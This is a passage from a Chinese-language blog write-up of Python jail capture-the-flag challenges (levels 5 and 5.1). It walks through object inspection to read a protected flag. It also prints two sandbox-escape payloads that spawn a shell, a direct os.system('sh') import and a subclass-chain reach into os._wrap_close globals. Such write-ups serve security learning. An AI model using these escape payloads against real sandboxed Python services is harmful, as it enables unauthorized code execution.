<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span>my_flag<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'__weakref__'</span><span class="token punctuation">,</span> <span class="token string">'flag_level5'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>有一个<code>flag_level5</code>类</p>
<p>尝试直接查看<code>my_flag.flag_level5</code>，返回DELETED，看来有做保护</p>
<p>继续跟进<code>my_flag.flag_level5</code>看看</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span>my_flag<span class="token punctuation">.</span>flag_level5<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__add__'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__contains__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dict__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__getnewargs__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__iter__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__len__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__mod__'</span><span class="token punctuation">,</span> <span class="token string">'__module__'</span><span class="token punctuation">,</span> <span class="token string">'__mul__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__rmod__'</span><span class="token punctuation">,</span> <span class="token string">'__rmul__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'__weakref__'</span><span class="token punctuation">,</span> <span class="token string">'capitalize'</span><span class="token punctuation">,</span> <span class="token string">'casefold'</span><span class="token punctuation">,</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token string">'count'</span><span class="token punctuation">,</span> <span class="token string">'encode'</span><span class="token punctuation">,</span> <span class="token string">'endswith'</span><span class="token punctuation">,</span> <span class="token string">'expandtabs'</span><span class="token punctuation">,</span> <span class="token string">'find'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'format_map'</span><span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'isalnum'</span><span class="token punctuation">,</span> <span class="token string">'isalpha'</span><span class="token punctuation">,</span> <span class="token string">'isascii'</span><span class="token punctuation">,</span> <span class="token string">'isdecimal'</span><span class="token punctuation">,</span> <span class="token string">'isdigit'</span><span class="token punctuation">,</span> <span class="token string">'isidentifier'</span><span class="token punctuation">,</span> <span class="token string">'islower'</span><span class="token punctuation">,</span> <span class="token string">'isnumeric'</span><span class="token punctuation">,</span> <span class="token string">'isprintable'</span><span class="token punctuation">,</span> <span class="token string">'isspace'</span><span class="token punctuation">,</span> <span class="token string">'istitle'</span><span class="token punctuation">,</span> <span class="token string">'isupper'</span><span class="token punctuation">,</span> <span class="token string">'join'</span><span class="token punctuation">,</span> <span class="token string">'ljust'</span><span class="token punctuation">,</span> <span class="token string">'lower'</span><span class="token punctuation">,</span> <span class="token string">'lstrip'</span><span class="token punctuation">,</span> <span class="token string">'maketrans'</span><span class="token punctuation">,</span> <span class="token string">'partition'</span><span class="token punctuation">,</span> <span class="token string">'removeprefix'</span><span class="token punctuation">,</span> <span class="token string">'removesuffix'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'rfind'</span><span class="token punctuation">,</span> <span class="token string">'rindex'</span><span class="token punctuation">,</span> <span class="token string">'rjust'</span><span class="token punctuation">,</span> <span class="token string">'rpartition'</span><span class="token punctuation">,</span> <span class="token string">'rsplit'</span><span class="token punctuation">,</span> <span class="token string">'rstrip'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'splitlines'</span><span class="token punctuation">,</span> <span class="token string">'startswith'</span><span class="token punctuation">,</span> <span class="token string">'strip'</span><span class="token punctuation">,</span> <span class="token string">'swapcase'</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">'translate'</span><span class="token punctuation">,</span> <span class="token string">'upper'</span><span class="token punctuation">,</span> <span class="token string">'zfill'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>发现里面有个<code>encode</code>函数，尝试调用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">my_flag<span class="token punctuation">.</span>flag_level5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功返回flag</p>
<p><img src="/blog/2023/06/07/python-jail/image-20230710185454479.png" alt="image-20230710185454479"></p>
<h3 id="法2：一句话RCE一把梭"><a href="#法2：一句话RCE一把梭" class="headerlink" title="法2：一句话RCE一把梭"></a>法2：一句话RCE一把梭</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="level-5-1"><a href="#level-5-1" class="headerlink" title="level 5.1"></a><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2986">level 5.1</a></h2><p>没给源码</p>
<p>看题目描述是上一题的修复版，增加了RCE的难度</p>
<p>预期payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">my_flag<span class="token punctuation">.</span>flag_level5<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="法2：SSTI-getshell"><a href="#法2：SSTI-getshell" class="headerlink" title="法2：SSTI getshell"></a>法2：SSTI getshell</h3><p>和level 4.1一样，不过<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>的索引在倒数第六个</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>